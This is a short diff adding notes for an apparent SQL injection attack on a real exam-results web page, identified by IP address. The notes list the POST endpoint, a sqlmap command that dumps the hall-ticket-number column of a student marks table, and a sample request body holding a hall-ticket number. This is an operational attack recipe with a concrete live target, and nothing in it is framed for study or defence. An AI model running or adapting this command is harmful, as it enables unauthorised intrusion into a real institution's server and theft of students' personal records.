@@ -1,0 +1,3 @@
+http://202.63.117.72:80/result_july2025/22/generate_result.php (POST)  # sqlmap.py -r sql_search.txt -D exam1929 -T marks_be_32_may2025_main -C htno --dump --threads 10
+
+htno=100523733047&submit=SUBMIT
